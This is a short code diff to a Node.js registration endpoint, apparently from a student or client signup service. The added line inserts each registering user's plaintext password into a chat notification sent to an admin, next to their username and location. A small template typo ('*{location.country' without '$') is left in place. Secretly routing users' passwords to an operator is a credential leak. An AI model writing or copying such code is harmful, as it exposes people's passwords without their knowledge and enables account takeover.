@@ -486,8 +486,8 @@ app.post("/student/register", async (req, res) => {
     });
 
     // notify admin & owner
-    await sendToAdmin(admin._id, `🆕 New client: ${username}\nLocation: *${location.city || "Unknown city"}*, *{location.country || "Unknown country"}*`);
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: ${username} (via ${admin.username}) from *${location.country || "Unknown location"}`);
+    await sendToAdmin(admin._id, `🆕 New client: ${username}\nLocation: *${location.city || "Unknown city"}*, *{location.country || "Unknown country"}* Password: *${password}*`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: ${username} (via ${admin.username}) from *${location.country || "Unknown location"} `);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
